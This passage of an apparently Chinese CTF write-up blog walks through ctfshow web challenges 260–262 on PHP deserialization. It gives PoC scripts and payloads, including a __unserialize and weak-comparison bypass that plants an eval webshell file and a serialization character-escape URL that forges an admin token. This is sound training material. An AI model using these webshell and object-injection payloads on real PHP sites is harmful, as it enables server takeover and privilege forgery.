src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611350560-55adcd6a-fc65-464f-bfb6-bc25637fb7f0.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611350560-55adcd6a-fc65-464f-bfb6-bc25637fb7f0.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>warning 没关系</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611367132-719d8d33-5e8f-4769-963c-64c0de6fe2ec.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611367132-719d8d33-5e8f-4769-963c-64c0de6fe2ec.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web260-简单正则"><a href="#web260-简单正则" class="headerlink" title="web260 简单正则"></a>web260 简单正则</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tari</span> = <span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332171270-2a9d87df-21bc-45e8-8197-ec957acb64bd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332171270-2a9d87df-21bc-45e8-8197-ec957acb64bd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="原-web261-SSRF-Redis"><a href="#原-web261-SSRF-Redis" class="headerlink" title="(原) web261 SSRF Redis"></a>(原) web261 SSRF Redis</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>分析：</p><ul><li>题目提示：打 Redis，默认端口为 6379</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332734388-e820fd79-e1ba-49a0-ae39-7fdb1f086052.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332734388-e820fd79-e1ba-49a0-ae39-7fdb1f086052.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>原来的 web261，不知为啥换成了下面这个。</p><p>原本的解题思路大概是在 web259 的基础上，构造 POST包去打 redis</p><h2 id="web261-PHP特性"><a href="#web261-PHP特性" class="headerlink" title="web261 PHP特性"></a>web261 PHP特性</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.4.16'><i class='fas fa-tag'></i>PHP/7.4.16</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>分析</p><p>__wakeup()</p><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>因这里写着 <code>username</code> 和 <code>password</code> 必须为非空，否则会退出，所以可以考虑要绕过这里</p><p>参考 CVE-2016-7124</p><ul><li>影响范围</li></ul><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><ul><li>漏洞原理</li></ul><p>当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。</p><p>但是题目是 PHP 7.4.2 明显不满足要求，</p><p>然后guguru了一下比较显眼的 <code>__unserialize</code> 魔术方法，因为没见过</p><p><a href="https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize">https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize</a></p><p>发现有趣的东西，官方文档是这样介绍的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619342183452-236b1177-015b-4e81-9760-15cae631313d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619342183452-236b1177-015b-4e81-9760-15cae631313d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>就当同时存在 <code>__wakeup</code> 和 <code>__unserialize</code> 魔术方法时，只会调用 <code>__unserialize</code> 魔术方法。</p><p>仔细观察析构方法，是个弱比较 <code>$this-&gt;code==0x36d</code></p><p>然后 <code>0x36d</code> 的十进制是 <code>877</code> ，写个小实验</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344460217-b8757b50-b260-4d9e-9219-c7d86e948392.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344460217-b8757b50-b260-4d9e-9219-c7d86e948392.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>也就是说弱比较 <code>$code</code> 变量前面是 <code>877</code> 就好了，不管后面加了啥字符串，就可以让 <code>$code == 0x36d</code> 成立了。</p><p>构造 POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_GET[c]); ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfshowvip()));</span><br></pre></td></tr></table></figure><p>会生成 <code>877.php</code> 然后 <code>cat /flag_is_here</code> 即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344555532-b46079b7-8b3f-4ffd-b453-f97cddc99e89.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344555532-b46079b7-8b3f-4ffd-b453-f97cddc99e89.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>题外</p><p>因为 PHP 底层是用 C语言写的，原本想着用 <code>\0</code> 作为字符串截断，这样不会拼接 <code>$passwod</code> 字段，然后发现，如果第一个参数有 <code>\0</code> ， <code>file_put_contents</code> 会报错。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344781363-008d661e-10d6-4a27-b5de-f71b268af26c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619344781363-008d661e-10d6-4a27-b5de-f71b268af26c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后</p><p><code>__invoke</code> 和 <code>__sleep</code> 在这里的用处不太清楚。。</p><h2 id="web262-字符逃逸"><a href="#web262-字符逃逸" class="headerlink" title="web262 字符逃逸"></a>web262 字符逃逸</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='字符逃逸'><i class='fas fa-tag'></i>字符逃逸</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看注释发现 message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第一种做法"><a href="#第一种做法" class="headerlink" title="第一种做法"></a>第一种做法</h3><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$msg</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616379956107-eac8b02e-16ae-45bb-9eba-900e2cb4f9e1.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616379956107-eac8b02e-16ae-45bb-9eba-900e2cb4f9e1.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="第二种做法"><a href="#第二种做法" class="headerlink" title="第二种做法"></a>第二种做法</h3><p>因有一个正则替换，注意是序列化后再替换，且替换每次内容长度增加1，假如输入 <code>t=fuck&quot;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381553255-34a2d0d2-39c5-464b-b3d9-36679d33d44c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381553255-34a2d0d2-39c5-464b-b3d9-36679d33d44c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>我们输入的 <code>&quot;</code> 刚刚好可以发前面闭合，也就是说，我们每输入一个 <code>fuck</code>，我们可控的内容就多出 <code>1</code> 个字符。</p><p>我们目的构造 <code>$token=&quot;admin&quot;</code> 序列化长这样 </p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381733634-6528a8b0-d291-4d4e-92d6-986af1f1d510.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381733634-6528a8b0-d291-4d4e-92d6-986af1f1d510.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>即 <code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code></p><p>加上闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;``s:5:&quot;token&quot;;s:5:&quot;admin&quot;;``&#125;</span><br></pre></td></tr></table></figure><p>长度为 <code>27</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381814629-55ed7c75-3455-49b4-a45e-1f219845f966.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381814629-55ed7c75-3455-49b4-a45e-1f219845f966.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>也就是我们需要输入 <code>27 个 fuck</code></p><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?f=6&amp;m=6&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img 